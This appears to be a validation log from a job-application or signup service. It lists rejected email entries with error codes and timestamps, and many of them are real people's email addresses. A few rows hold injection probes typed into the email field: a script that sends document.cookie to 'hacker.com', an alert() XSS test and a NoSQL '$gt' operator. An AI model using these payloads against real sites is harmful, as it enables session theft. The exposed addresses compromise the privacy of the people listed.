694f8e6285607b9ce2222599,shrutikhadtare2004@gmail,JOB-PCWAVIYJ,,SYNTAX_ERROR,2025-12-27T07:44:34.775Z
694f9e8c03e62e4f337629a3,job-cd6mz9yy,JOB-INUKWFTA,,SYNTAX_ERROR,2025-12-27T08:53:32.034Z
694facbaedfaab3a0e3fe1c6,nanipadavalab2,JOB-1318PHFS,,SYNTAX_ERROR,2025-12-27T09:54:02.425Z
694fe1877eea6d1835575cc5,job-9wyjl30m,JOB-IO97FX2V,,SYNTAX_ERROR,2025-12-27T13:39:19.248Z
694fedecd6259d2a81de9dd7,job-bm14bgjr,JOB-HAGGFM4O,,SYNTAX_ERROR,2025-12-27T14:32:12.175Z
6950068fee51225628c1fc2f,m,JOB-U26EBDT1,,SYNTAX_ERROR,2025-12-27T16:17:19.375Z
69501266ee51225628c1fc9f,job-18ht8tlc,JOB-BOEB67GF,,SYNTAX_ERROR,2025-12-27T17:07:50.641Z
695033a4597802869040e331,nasma-at-b525332b0,JOB-36UDDUO9,,SYNTAX_ERROR,2025-12-27T19:29:40.446Z
6950b6594be292702868b279,ananyasahurocks@gmail.con,JOB-R1PXHKDZ,gmail.con,NO_MX_SERVER,2025-12-28T04:47:21.460Z
6950f562f6482db131439eb9,adityadev7012@ gmail.com,JOB-7EYDGVDN,,SYNTAX_ERROR,2025-12-28T09:16:18.498Z
6950fa64f6482db131439ede,job-citprw98,JOB-54JLJ0OU,,SYNTAX_ERROR,2025-12-28T09:37:40.554Z
6950fa5df6482db131439edb,siddhimishra9811@gmaul.com,JOB-RMMJDTNY,gmaul.com,NO_MX_SERVER,2025-12-28T09:37:33.131Z
69510aaee1ff819b21eb9cf2,job-4bsunqc8,JOB-VW7MT76A,,SYNTAX_ERROR,2025-12-28T10:47:10.250Z
69510dbb82de4ea0c78d2bff,amalaammu720@gmal.com,JOB-HQYDEZAW,gmal.com,NO_MX_SERVER,2025-12-28T11:00:11.608Z
69513913028c4a02be705fab,g2nthkq4,JOB-NRECCGZ2,,SYNTAX_ERROR,2025-12-28T14:05:07.443Z
695151e309b088389d345722,anshikap5,JOB-0EBHCBWX,,SYNTAX_ERROR,2025-12-28T15:50:59.878Z
6951552f01d63a575e4c77ae,anuj200519@gmail.co.,JOB-RTJG6MV4,,SYNTAX_ERROR,2025-12-28T16:05:03.179Z
6951554bfa18e863f50e1ce7,pghr25mohd_f@mdi,JOB-Z65BIFH1,,SYNTAX_ERROR,2025-12-28T16:05:31.791Z
6951572e4a9ca301b8467bf4,deshmukhanchal 11@gmail.com,JOB-AKTOCUOL,,SYNTAX_ERROR,2025-12-28T16:13:34.883Z
695163868dd579b0587b554f,job-smemmlvj,JOB-EKLR98K7,,SYNTAX_ERROR,2025-12-28T17:06:14.517Z
69516b418dd579b0587b55ab,job-ievkrnhg,JOB-DK9XI1K4,,SYNTAX_ERROR,2025-12-28T17:39:13.127Z
6951dac1e38ac5148ebb0817,kanakana,JOB-KXKK6AUJ,,SYNTAX_ERROR,2025-12-29T01:34:57.460Z
6951e726baf09cece14df960,nehaphirke321@gmail,JOB-SNB2Y05W,,SYNTAX_ERROR,2025-12-29T02:27:50.992Z
695209491618bd8ab53c1517,tejalsingh232@gmail.cok,JOB-4L87J119,gmail.cok,NO_MX_SERVER,2025-12-29T04:53:29.392Z
695220b67bc0672bcd038239,9hm0wv7k,JOB-QWE3G3P7,,SYNTAX_ERROR,2025-12-29T06:33:26.926Z
695235842646041a7ae272a9,uh,JOB-KHNP94B6,,SYNTAX_ERROR,2025-12-29T08:02:12.372Z
695234c22646041a7ae27298,manasvi354@gmail.con,JOB-WH2OREDB,gmail.con,NO_MX_SERVER,2025-12-29T07:58:58.847Z
6952580843b9b9877443a367,job-0mzzq8xi,JOB-4QONEOAV,,SYNTAX_ERROR,2025-12-29T10:29:28.006Z
69528936cdc9607430c6bd49,unnati.ingole@cumminscollege.inn,JOB-B5D420SX,cumminscollege.inn,NO_MX_SERVER,2025-12-29T13:59:18.464Z
6952ad0f6eeb01113f49ee62,job-oycm7ziq,JOB-82M1K4DR,,SYNTAX_ERROR,2025-12-29T16:32:15.554Z
6952ba93ac928aa8361017e4,job-21ofutzq,JOB-ROAJI66U,,SYNTAX_ERROR,2025-12-29T17:29:55.448Z
6952c5abd82089f1b458f7f8,v24hfs7s03gmail.com,JOB-7AY3IFZ3,,SYNTAX_ERROR,2025-12-29T18:17:15.450Z
69534c515d59ba3fa99fce30,job-z449v5rt,JOB-XIY1GPLP,,SYNTAX_ERROR,2025-12-30T03:51:45.405Z
695383ad4112a5815e5ef74c,job-pi7zsxlp,JOB-ADFZZ5K6,,SYNTAX_ERROR,2025-12-30T07:47:57.601Z
695383b44112a5815e5ef74f,pi7zsxlp,JOB-D427SVO9,,SYNTAX_ERROR,2025-12-30T07:48:04.093Z
69538d7f39c20a9a6e1cfd63,job-5diohedz,JOB-JTQMGGDT,,SYNTAX_ERROR,2025-12-30T08:29:51.095Z
6953f19c7889bba52272b377,deshmukhnikhilesh777@gmail,JOB-AXKTFZ7H,,SYNTAX_ERROR,2025-12-30T15:37:00.608Z
6953fe990230f6e5be42605c,job-hn74xtv3,JOB-C2HWOSA8,,SYNTAX_ERROR,2025-12-30T16:32:25.313Z
69549b8f89327ada6e72d039,job-sxqby0i9,JOB-68A496C9,,SYNTAX_ERROR,2025-12-31T03:42:07.443Z
69546c936602c088661cf957,ankitmit1683@refuffmaol.com,JOB-ZJQ74HYX,refuffmaol.com,NO_MX_SERVER,2025-12-31T00:21:39.491Z
6954ad3e35a90e8b6940f71d,job-ing7nm3v,JOB-HATOE11E,,SYNTAX_ERROR,2025-12-31T04:57:34.714Z
6954c7d8e4f0f27f75893d57,job-chyl6bh1,JOB-960OHWXD,,SYNTAX_ERROR,2025-12-31T06:51:04.134Z
6954df1ce445ee03c783d6dd,camarambedu@gmail. com,JOB-9TWF6COL,,SYNTAX_ERROR,2025-12-31T08:30:20.032Z
6954fe9727d29e26c1e15a2f,swethasswethas53,JOB-HCWTOZTX,,SYNTAX_ERROR,2025-12-31T10:44:39.094Z
69551d26819a5de0604cc183,job-cr2rkcf3,JOB-STGO7UWS,,SYNTAX_ERROR,2025-12-31T12:55:02.792Z
69552d856d7ebe6a9326e357,sainigunjan151@gmail,JOB-HLLF05R6,,SYNTAX_ERROR,2025-12-31T14:04:53.598Z
695554f5025b4ae36d1e5581,job-mcx5ivov,JOB-F11MTRBF,,SYNTAX_ERROR,2025-12-31T16:53:09.743Z
69555512025b4ae36d1e5584,job-f11mtrbf,JOB-L5G16E49,,SYNTAX_ERROR,2025-12-31T16:53:38.478Z
69555ae8a041fcc8fc59a88e,fk,JOB-7L5ALAUX,,SYNTAX_ERROR,2025-12-31T17:18:32.662Z
695641a87a53b2b9d48de76f,bhat.hemang@gmail,JOB-G1XAQGM3,,SYNTAX_ERROR,2026-01-01T09:43:04.186Z
6956545c84bf9d22b0447cac,fffff@fff.com,JOB-6OEVN1OR,fff.com,NO_MX_SERVER,2026-01-01T11:02:52.708Z
6956bb151d4002b8fd09e4e6,job-9p7xdnlz,JOB-7CPG1BQ2,,SYNTAX_ERROR,2026-01-01T18:21:09.144Z
6957b78ec4f0e9928ccf8c86,x,JOB-E0JWEY2Y,,SYNTAX_ERROR,2026-01-02T12:18:22.356Z
6957c8016eacdcc8efb39835,man,JOB-E30NFBKB,,SYNTAX_ERROR,2026-01-02T13:28:33.538Z
6957d409cba7e3805649c683,job-zll3vttp,JOB-Q11DTDUY,,SYNTAX_ERROR,2026-01-02T14:19:53.934Z
69589305770c813451a47d81,nmcherala_b22@el,JOB-1QQ17LMW,,SYNTAX_ERROR,2026-01-03T03:54:45.884Z
6959c99b1cfda4e03a22330b,srinivasmalkari 57@@gmail.com,JOB-B796JWY6,,SYNTAX_ERROR,2026-01-04T01:59:55.780Z
6959f54317d1c38826570963,job-zy0tnimf,JOB-3Z73BULT,,SYNTAX_ERROR,2026-01-04T05:06:11.350Z
695a051b13e31ebd497a639f,job-r6k7kdqs,JOB-TUBKQHQS,,SYNTAX_ERROR,2026-01-04T06:13:47.462Z
695a5e8dc064808c442b75af,job-r7amo6ff,JOB-H9JRPZY2,,SYNTAX_ERROR,2026-01-04T12:35:25.345Z
695a7d0b106041393d4bd24e,job-oph0d2ug,JOB-ZYVDAJEN,,SYNTAX_ERROR,2026-01-04T14:45:31.504Z
695a8435b7f0367158bcfd97,job-njwov4i2,JOB-LA00TCF9,,SYNTAX_ERROR,2026-01-04T15:16:05.523Z
695a981fb54b400f1cadac5f,vaibhavaws,JOB-3FRADOKJ,,SYNTAX_ERROR,2026-01-04T16:41:03.115Z
695aaa3436e44be4c2021608,t,JOB-9B52W5W6,,SYNTAX_ERROR,2026-01-04T17:58:12.661Z
695ab12b36e44be4c2021640,job-ud6s6nfy,JOB-U62EKAQZ,,SYNTAX_ERROR,2026-01-04T18:27:55.648Z
695ab52a36e44be4c2021668,job-kl72mnxo,JOB-WSPXQ3HT,,SYNTAX_ERROR,2026-01-04T18:44:58.222Z
695b4a55ee5bbf2cc84067ab,job-smboxcgk,JOB-UJYE1RCG,,SYNTAX_ERROR,2026-01-05T05:21:25.109Z
695b505a9c1b52eb2dcf66ec,job-dh7qkqt9,JOB-WCN3A80Y,,SYNTAX_ERROR,2026-01-05T05:47:06.678Z
695b506b9c1b52eb2dcf66f0,job-wcn3a80y,JOB-LKSJC2SA,,SYNTAX_ERROR,2026-01-05T05:47:23.140Z
695b52179c1b52eb2dcf6709,gatemine18gmail.com,JOB-VKGLLJ9C,,SYNTAX_ERROR,2026-01-05T05:54:31.204Z
695b5ddf69d56505438fa339,job-j89ww9dw,JOB-6H140NJC,,SYNTAX_ERROR,2026-01-05T06:44:47.875Z
695b7f404888a6928dfda7c8,akulkumar973@gmail.con,JOB-4FZO6M0B,gmail.con,NO_MX_SERVER,2026-01-05T09:07:12.190Z
695b92124888a6928dfda872,job-xi4gzgaf,JOB-WUTKBRU4,,SYNTAX_ERROR,2026-01-05T10:27:30.942Z
695b94e44888a6928dfda885,afrina,JOB-1VZIEUKO,,SYNTAX_ERROR,2026-01-05T10:39:32.803Z
695b98ad7fceecb2c5bf5845,ifra024btit23@igdtuw.ac.in,JOB-154O1TV8,igdtuw.ac.in,NO_MX_SERVER,2026-01-05T10:55:41.097Z
695ba1787fceecb2c5bf5894,job-k8w8oxbu,JOB-YAY5YRMN,,SYNTAX_ERROR,2026-01-05T11:33:12.895Z
695ba64d7fceecb2c5bf58b6,job-rna7weec,JOB-HOCM9VZI,,SYNTAX_ERROR,2026-01-05T11:53:49.642Z
695bb7e3f72b9cb378c1d335,kin,JOB-8IRU51IS,,SYNTAX_ERROR,2026-01-05T13:08:51.245Z
695bbe48f72b9cb378c1d36c,job-9emetodg,JOB-GNH0NMDY,,SYNTAX_ERROR,2026-01-05T13:36:08.654Z
695bb2e7f72b9cb378c1d2e1,hshs@jsks.cksk,JOB-HIMBBEK5,jsks.cksk,NO_MX_SERVER,2026-01-05T12:47:35.930Z
695bc7e5f72b9cb378c1d3d2,mfhy6qjq,JOB-MFPLVPOL,,SYNTAX_ERROR,2026-01-05T14:17:09.009Z
695bc90bf72b9cb378c1d3df,job-jpgtc4sc,JOB-02CZW7XT,,SYNTAX_ERROR,2026-01-05T14:22:03.086Z
695bcfb69878f5d242fcf59b,3jm2rt9w,JOB-GZSLG0KX,,SYNTAX_ERROR,2026-01-05T14:50:30.743Z
695bd5139878f5d242fcf5cf,job-et8ozp9l,JOB-QTW649OV,,SYNTAX_ERROR,2026-01-05T15:13:23.422Z
695bd8857effa390f2f548cd,rakshitashetty41@gmail. com,JOB-3PDXKOXF,,SYNTAX_ERROR,2026-01-05T15:28:05.528Z
695bdd3e07b90f1187083030,detear21@gmal.com,JOB-JLX6UUMB,gmal.com,NO_MX_SERVER,2026-01-05T15:48:14.140Z
695bee2e87f318b7e55a9193,job-6u0qr4pv,JOB-QOWWGIMS,,SYNTAX_ERROR,2026-01-05T17:00:30.909Z
695bfb02d1fae52278e60c2c,gvs5,JOB-JU03OM7T,,SYNTAX_ERROR,2026-01-05T17:55:14.280Z
695c7ff98993ba5af44e1628,namita.kumari.2210@ gmail.com,JOB-XH928BO2,,SYNTAX_ERROR,2026-01-06T03:22:33.303Z
695c8416f4f204c160a47e55,013aanya@gmail,JOB-NZE9I7O5,,SYNTAX_ERROR,2026-01-06T03:40:06.456Z
695c9c4b94aae2be0c092e66,send8,JOB-59A8WCYX,,SYNTAX_ERROR,2026-01-06T05:23:23.588Z
695c9c7494aae2be0c092e6c,job-q2ycvleu,JOB-8O7J6BTV,,SYNTAX_ERROR,2026-01-06T05:24:04.069Z
695cb6c654d88cad7950c477,job-0995rnjv,JOB-K5FQW6WL,,SYNTAX_ERROR,2026-01-06T07:16:22.467Z
695cba85edf2cb2fa58183f5,job-paj9nfj4,JOB-60Z80FUZ,,SYNTAX_ERROR,2026-01-06T07:32:21.578Z
695cc269edf2cb2fa5818426,lalkd,JOB-9OBQB8ZW,,SYNTAX_ERROR,2026-01-06T08:06:01.590Z
695cd255a6c912a47020a84b,rimzim varma.work@gmail.com,JOB-RHHB4EH4,,SYNTAX_ERROR,2026-01-06T09:13:57.270Z
695ce22a07fa8f8873654142,subhrajeet.work,JOB-SXMHQHX0,,SYNTAX_ERROR,2026-01-06T10:21:30.890Z
695d0e9620d91982e4202750,firashammami950@gmail.comas,JOB-4F52ZXSH,gmail.comas,NO_MX_SERVER,2026-01-06T13:31:02.044Z
695dea82dbc4dc9e1bb660b4,job-8138f11h,JOB-SQVNVHWP,,SYNTAX_ERROR,2026-01-07T05:09:22.146Z
695dfe1dc58151258fd17e8c,saviyogeorge903734@gmail. com,JOB-AYOOZAFC,,SYNTAX_ERROR,2026-01-07T06:33:01.765Z
695dfee1ab85588665233eb5,job-vqai8sz4,JOB-TEGBHTT3,,SYNTAX_ERROR,2026-01-07T06:36:17.363Z
695e11e5d7e9e691be086faa,h23071901000152gmail.com,JOB-KQF1LMEC,,SYNTAX_ERROR,2026-01-07T07:57:25.482Z
695e1228d7e9e691be086fb3,muskanbhartii6753@gmail,JOB-1B6VH3W9,,SYNTAX_ERROR,2026-01-07T07:58:32.231Z
695e2e0e97ea7bc16cf798aa,harshvardhanpatil915@gmail.om,JOB-G5LDQU16,gmail.om,NO_MX_SERVER,2026-01-07T09:57:34.020Z
695e51031a65f9f86b393684,udaykirakalli1722,JOB-ZVA6JC5N,,SYNTAX_ERROR,2026-01-07T12:26:43.134Z
695e522c1a65f9f86b39368e,job-moptcbnr,JOB-NSLZKT20,,SYNTAX_ERROR,2026-01-07T12:31:40.285Z
695e4d28fbea204ad3c32220,img_2023021@iiitm.ac,JOB-HRUDVSWX,iiitm.ac,NO_MX_SERVER,2026-01-07T12:10:16.334Z
695e80a585f84c7a4d99e422,parth_s@mt.iitr.a.cin,JOB-2FG11SFM,mt.iitr.a.cin,NO_MX_SERVER,2026-01-07T15:49:57.020Z
695eb3a975e4dafa7c5fe43f,swapnendu 24chakraborty@gmail.com,JOB-6FN7X5KQ,,SYNTAX_ERROR,2026-01-07T19:27:37.271Z
695f21908b9460f996e08ff4,haratejdivi2005@gmail.com,JOB-RNC13YFL,gmail.com,DUPLICATE_EMAIL,2026-01-08T03:16:32.561Z
695f5193c37032a9353fe6dc,job-kcdh9mfa,JOB-OOCNERUK,,SYNTAX_ERROR,2026-01-08T06:41:23.130Z
695f57145213bd1d74481116,job-3a35mt3m,JOB-XWUOFFGC,,SYNTAX_ERROR,2026-01-08T07:04:52.769Z
695f38ae10ffee72f4040a42,arijitkdas9210@gmail.cpm,JOB-C152UHA0,gmail.cpm,NO_MX_SERVER,2026-01-08T04:55:10.423Z
695f6b13ec11f5e49e4901c3,job-mhawea2q,JOB-W9IYDNJD,,SYNTAX_ERROR,2026-01-08T08:30:11.952Z
695f7d1911292102ffa8577f,job-xhekrspm,JOB-TJZXXZZQ,,SYNTAX_ERROR,2026-01-08T09:47:05.374Z
695f971b49faa92ae9d5f384,shubhamv4488@gmail.com,JOB-L2LJOE6M,gmail.com,DUPLICATE_EMAIL,2026-01-08T11:38:03.379Z
695f9c04e0198d40bc25e39b,job-84edavyx,JOB-Z9X4YT9K,,SYNTAX_ERROR,2026-01-08T11:59:00.226Z
695fae3ad4dd7e8bd66d1581,yugalthakre4@gmail.con,JOB-TUEGRGH6,gmail.con,NO_MX_SERVER,2026-01-08T13:16:42.354Z
695fb6e6d4dd7e8bd66d15d7,jaind(896@gmail.com,JOB-IPO69JVK,,SYNTAX_ERROR,2026-01-08T13:53:42.046Z
695fbd72c6803694834ce65e,satyam26.g@gmail.con,JOB-WLWQOKNG,gmail.con,NO_MX_SERVER,2026-01-08T14:21:38.595Z
695fbf48c6803694834ce66f,dsvdf@d.com,JOB-OGUGXBRQ,d.com,NO_MX_SERVER,2026-01-08T14:29:28.196Z
696067a80c9046e620fe2f78,h@k.com,JOB-HWM74NS3,k.com,NO_MX_SERVER,2026-01-09T02:27:52.799Z
69609016037408ae81e93380,sharveshhh088,JOB-E0JXXN0L,,SYNTAX_ERROR,2026-01-09T05:20:22.767Z
69609cc5d68864a5ec13e7df,job-sunliqnf,JOB-J1UYZRAG,,SYNTAX_ERROR,2026-01-09T06:14:29.797Z
6960d64059c985ed2691d2de,vaibhavgowda500@gmail.cok,JOB-FLJG9XNA,gmail.cok,NO_MX_SERVER,2026-01-09T10:19:44.103Z
6960f6be4bc6b4323e285c10,yhu,JOB-7JE5NJVO,,SYNTAX_ERROR,2026-01-09T12:38:22.741Z
6960e594c79f40e315e6fd48,tushar.s1809@gmaik.com,JOB-3Q9RNVAS,gmaik.com,NO_MX_SERVER,2026-01-09T11:25:08.726Z
6960ec298d56f9552b6f176f,ankit.agrawal2024@v8tstudent.ac.in,JOB-MALMGCXR,v8tstudent.ac.in,NO_MX_SERVER,2026-01-09T11:53:13.674Z
69610a6da39797b39800cab3,job-kpptuac1,JOB-MTA03URL,,SYNTAX_ERROR,2026-01-09T14:02:21.425Z
69610a8da39797b39800cab8,job-mta03url,JOB-Q1ZYQVYS,,SYNTAX_ERROR,2026-01-09T14:02:53.701Z
69613663a15ac4ac54e7b31b,job-vxbdbgib,JOB-GFXSKE5W,,SYNTAX_ERROR,2026-01-09T17:09:55.010Z
696137b415e116b6cc4996bd,jwjekekeke,JOB-G99633TW,,SYNTAX_ERROR,2026-01-09T17:15:32.465Z
6961296fc3de8e723a5919b0,vijeta149btit24@igdtuw.ac.in,JOB-N1ZAYJ0K,igdtuw.ac.in,NO_MX_SERVER,2026-01-09T16:14:39.737Z
6961e138d7ef5a89adfc3a7b,ms,JOB-RIS25MUL,,SYNTAX_ERROR,2026-01-10T05:18:48.364Z
6961e9585dce333ca7376b79,job-ll7vp23q,JOB-1Q17VWMB,,SYNTAX_ERROR,2026-01-10T05:53:28.048Z
6961e6a2d7ef5a89adfc3a91,ms.madhanyt@gmqil.xom,JOB-321AUSLW,gmqil.xom,NO_MX_SERVER,2026-01-10T05:41:54.981Z
69622e96b0cb68f746e27e08,bkc tumhari,JOB-P5A1ASLC,,SYNTAX_ERROR,2026-01-10T10:48:54.490Z
6962514b98b421873ff60978,job-1vwcaant,JOB-XPOK9KE0,,SYNTAX_ERROR,2026-01-10T13:16:59.418Z
69625f0b564799a3668c39c2,rish,JOB-4N86MK75,,SYNTAX_ERROR,2026-01-10T14:15:39.411Z
696271b809ace74e0d146d3e,job-7nbb4kcq,JOB-FPL0B9MQ,,SYNTAX_ERROR,2026-01-10T15:35:20.257Z
6962791109ace74e0d146d82,as,JOB-ECWNMV9L,,SYNTAX_ERROR,2026-01-10T16:06:41.745Z
6962791409ace74e0d146d87,asdda,JOB-RXRG2J5G,,SYNTAX_ERROR,2026-01-10T16:06:44.931Z
6962791509ace74e0d146d8a,asddad,JOB-KBDOJNJ5,,SYNTAX_ERROR,2026-01-10T16:06:45.860Z
6962791609ace74e0d146d8d,asddaddd,JOB-Y0S14I5F,,SYNTAX_ERROR,2026-01-10T16:06:46.710Z
6962791709ace74e0d146d90,asddadddd,JOB-9SLMXL67,,SYNTAX_ERROR,2026-01-10T16:06:47.841Z
6962791809ace74e0d146d93,asddaddddd,JOB-R4W2PIBU,,SYNTAX_ERROR,2026-01-10T16:06:48.875Z
6962791b09ace74e0d146d97,asddadddddd,JOB-ROE8UTU8,,SYNTAX_ERROR,2026-01-10T16:06:51.203Z
69627a3009ace74e0d146da1,asdf,JOB-6EWRH5LI,,SYNTAX_ERROR,2026-01-10T16:11:28.408Z
69627a3109ace74e0d146da4,asdfg,JOB-U5UXTYRS,,SYNTAX_ERROR,2026-01-10T16:11:29.432Z
69627b3c09ace74e0d146da7,<script>fetch('https://hacker.com?cookie=' + document.cookie)</script>,JOB-NQ062WXS,,SYNTAX_ERROR,2026-01-10T16:15:56.725Z
69627b5b09ace74e0d146dac,ab,JOB-91XIKQMO,,SYNTAX_ERROR,2026-01-10T16:16:27.680Z
69627b6209ace74e0d146daf,b,JOB-E8I3BV92,,SYNTAX_ERROR,2026-01-10T16:16:34.641Z
69627b6509ace74e0d146db2,c,JOB-K4GOO8QY,,SYNTAX_ERROR,2026-01-10T16:16:37.713Z
69627bee09ace74e0d146dba,"{""$gt"": """"}",JOB-L1FHO4U2,,SYNTAX_ERROR,2026-01-10T16:18:54.560Z
69627c0909ace74e0d146dbd,<script>alert('hacked')</script>,JOB-YUS9W3GS,,SYNTAX_ERROR,2026-01-10T16:19:21.613Z
696278fe09ace74e0d146d62,likeyou@gmail.comm,JOB-IEE4XJDS,gmail.comm,NO_MX_SERVER,2026-01-10T16:06:22.768Z
6962790109ace74e0d146d65,likeyou@gmail.comms,JOB-284FF5FA,gmail.comms,NO_MX_SERVER,2026-01-10T16:06:25.119Z
6962790809ace74e0d146d75,likeyou@gmail.commsasasdf,JOB-FLU9UFZ8,gmail.commsasasdf,NO_MX_SERVER,2026-01-10T16:06:32.107Z
6962790609ace74e0d146d6f,likeyou@gmail.commsasas,JOB-XPUTVQT1,gmail.commsasas,NO_MX_SERVER,2026-01-10T16:06:30.040Z
6962790709ace74e0d146d72,likeyou@gmail.commsasasd,JOB-5NYI70PV,gmail.commsasasd,NO_MX_SERVER,2026-01-10T16:06:31.077Z
6962790a09ace74e0d146d7b,likeyou@gmail.commsasasdfgh,JOB-UZPN1Z6P,gmail.commsasasdfgh,NO_MX_SERVER,2026-01-10T16:06:34.137Z
6962790209ace74e0d146d68,likeyou@gmail.commsas,JOB-S038QXHY,gmail.commsas,NO_MX_SERVER,2026-01-10T16:06:26.868Z
6962790909ace74e0d146d78,likeyou@gmail.commsasasdfg,JOB-9LCBVG9B,gmail.commsasasdfg,NO_MX_SERVER,2026-01-10T16:06:33.060Z
6962790b09ace74e0d146d7e,likeyou@gmail.commsasasdfghj,JOB-YXDNOYHJ,gmail.commsasasdfghj,NO_MX_SERVER,2026-01-10T16:06:35.187Z
6962790509ace74e0d146d6c,likeyou@gmail.commsasa,JOB-IXOHO3XH,gmail.commsasa,NO_MX_SERVER,2026-01-10T16:06:29.053Z
69629683b72222f16ce356ee,wayalgayatri07@gmail.com,JOB-XMD1VQRR,gmail.com,DUPLICATE_EMAIL,2026-01-10T18:12:19.983Z
6962a471c20888c68808a474,job-37le8320,JOB-OSPCDRVQ,,SYNTAX_ERROR,2026-01-10T19:11:45.854Z
6962a47dc20888c68808a477,job-ospcdrvq,JOB-6B4B06A9,,SYNTAX_ERROR,2026-01-10T19:11:57.508Z
69632138d546339c962836fe,job-6s7r2a9l,JOB-TSTACG5D,,SYNTAX_ERROR,2026-01-11T04:04:08.191Z
69632768b87903646d44fe02,job-q7mn5g5l,JOB-NVAPGUX9,,SYNTAX_ERROR,2026-01-11T04:30:32.701Z
69632f3afaeae62cba4a60a7,itsslogeswar,JOB-DDLCH00N,,SYNTAX_ERROR,2026-01-11T05:03:54.034Z
696344799fa04f78a8c3352a,sejalkanoje30@gmail.com,JOB-QVI81TTG,gmail.com,DUPLICATE_EMAIL,2026-01-11T06:34:33.773Z
69638483c2b1380d3e207027,tejaldeore77@gmail.com,JOB-CCVAVB75,gmail.com,DUPLICATE_EMAIL,2026-01-11T11:07:47.314Z
696392e75880fddafacf9811,सोनवणे,JOB-9I38Z2BA,,SYNTAX_ERROR,2026-01-11T12:09:11.915Z
696399dc7fc326056d2f0dc3,m.,JOB-CSW55841,,SYNTAX_ERROR,2026-01-11T12:38:52.636Z
696391815880fddafacf9804,tiwariravikant04@gmail.con,JOB-BXAK9DQJ,gmail.con,NO_MX_SERVER,2026-01-11T12:03:13.173Z
69637223eec30b51fd68b308,kashishcoe021@gmail.ocm,JOB-AULFIP82,gmail.ocm,NO_MX_SERVER,2026-01-11T09:49:23.143Z
69639ed27fc326056d2f0de0,job-mdei1d8k,JOB-Z8NYTFP2,,SYNTAX_ERROR,2026-01-11T13:00:02.038Z
69639edb7fc326056d2f0de3,job-z8nytfp2,JOB-9SS1LG22,,SYNTAX_ERROR,2026-01-11T13:00:11.832Z
6963a3a2ff4ab60c3f4e908b,job-454i58mc,JOB-XIYQVU02,,SYNTAX_ERROR,2026-01-11T13:20:34.526Z
6963b93a55b197f7e1823d73,xxxxx,JOB-LQH0VEH8,,SYNTAX_ERROR,2026-01-11T14:52:42.388Z
6963c1e9c7513e1d8bafd19c,amdflkgjdf;ofkd5@gmail.com,JOB-B79UYHAH,,SYNTAX_ERROR,2026-01-11T15:29:45.338Z
6963df7bf136b81a29bb680c,r636,JOB-FSJIH9IZ,,SYNTAX_ERROR,2026-01-11T17:35:55.187Z
6963ebb44789fc733fd67192,dygt,JOB-ABD7F2KQ,,SYNTAX_ERROR,2026-01-11T18:28:04.195Z
6963f967550cbf5e91ca4aa6,job-7skhhsdu,JOB-Q8DCOALM,,SYNTAX_ERROR,2026-01-11T19:26:31.016Z
696478b63bbf70f3080a5bcf,aryankumarmishragogenix,JOB-8UFUMYCH,,SYNTAX_ERROR,2026-01-12T04:29:42.737Z
69649458263cc2e7b42cce3f,job-ycpxfpnj,JOB-M8JTX6Z2,,SYNTAX_ERROR,2026-01-12T06:27:36.921Z
6964946a263cc2e7b42cce42,job-m8jtx6z2,JOB-3VUAY3Z4,,SYNTAX_ERROR,2026-01-12T06:27:54.669Z
6964bff60f3a869a036ab293,job-lh41j415,JOB-E1SBW113,,SYNTAX_ERROR,2026-01-12T09:33:42.222Z
6964ee631242ec30420aed30,job-wbjrlw6u,JOB-ZT1I0XKH,,SYNTAX_ERROR,2026-01-12T12:51:47.473Z
6964f80208ae596c2ce41755,2005raunakrathor@gmail,JOB-PU1SYNFW,,SYNTAX_ERROR,2026-01-12T13:32:50.163Z
6965114f5b1277ffb6d34822,job-epvv8y32,JOB-RZR43H8W,,SYNTAX_ERROR,2026-01-12T15:20:47.299Z
6965068732a6252e44f1c934,sethusree005@gmail.con,JOB-N9DEE8MJ,gmail.con,NO_MX_SERVER,2026-01-12T14:34:47.951Z
69651ac93978175122569867,konathalaanilkumar143@gmail.com1,JOB-7AOL8WBW,gmail.com1,NO_MX_SERVER,2026-01-12T16:01:13.712Z
6965413a865c7416ff8d344b,aman.shukla964gmail.com,JOB-D39LRSED,,SYNTAX_ERROR,2026-01-12T18:45:14.886Z
696541bb865c7416ff8d3451,job-ti5smx1j,JOB-GM7K8ZW1,,SYNTAX_ERROR,2026-01-12T18:47:23.669Z
6965d342bb74fe2caf4cbae4,nandhana.sivadas,JOB-5CZGRZUF,,SYNTAX_ERROR,2026-01-13T05:08:18.326Z
6965dc22d6e8a92fbd8a8f34,job-fzekq9kb,JOB-SYHCG4DN,,SYNTAX_ERROR,2026-01-13T05:46:10.442Z
6965dc5cdebe3230c0d50c10,job-syhcg4dn,JOB-L8FZ39AA,,SYNTAX_ERROR,2026-01-13T05:47:08.428Z
6965dc67debe3230c0d50c13,job-l8fz39aa,JOB-42CWK4US,,SYNTAX_ERROR,2026-01-13T05:47:19.475Z
6965e1704206fedef0564ba2,job-q7ef8qek,JOB-WXD2H9L2,,SYNTAX_ERROR,2026-01-13T06:08:48.968Z
6965e484f769832b00dd5a31,job-nxfqjbq6,JOB-A5UTXJNL,,SYNTAX_ERROR,2026-01-13T06:21:56.776Z
69660462b0762301436a9dfc,raikher,JOB-LSYHDUIA,,SYNTAX_ERROR,2026-01-13T08:37:54.490Z
696614c8817bdbad65a6caf3,job-ffhspn1t,JOB-5MITVX83,,SYNTAX_ERROR,2026-01-13T09:47:52.330Z
696603ab340daa29981785a0,komalptl385@gmail.vom,JOB-6PS500CF,gmail.vom,NO_MX_SERVER,2026-01-13T08:34:51.558Z
696642475b3f9af7d7ac2877,job-e49jgyd1,JOB-0Z3WXZMC,,SYNTAX_ERROR,2026-01-13T13:01:59.111Z
696685baa0500373540305dd,free**,JOB-EC36Y710,,SYNTAX_ERROR,2026-01-13T17:49:46.630Z
69675c3c6a5cf31133748ea6,job-k8jofkf5,JOB-4P6VDQD9,,SYNTAX_ERROR,2026-01-14T09:05:00.696Z
6967743508cb73743ff2bef4,job-rul1h8um,JOB-XHFX2ELV,,SYNTAX_ERROR,2026-01-14T10:47:17.219Z
6967b2081ea2db8c011744f3,job-hpt1z0tx,JOB-8GCSV21A,,SYNTAX_ERROR,2026-01-14T15:11:04.006Z
6967bd56b8cfe8772f714625,job-qob42y4v,JOB-WUQNOBZE,,SYNTAX_ERROR,2026-01-14T15:59:18.327Z
6967d16515c2259c85ca304a,job-kgvag11a,JOB-00M29AMI,,SYNTAX_ERROR,2026-01-14T17:24:53.368Z
6967dc2d0530fd500968abc9,hello,JOB-VISV7KDC,,SYNTAX_ERROR,2026-01-14T18:10:53.367Z
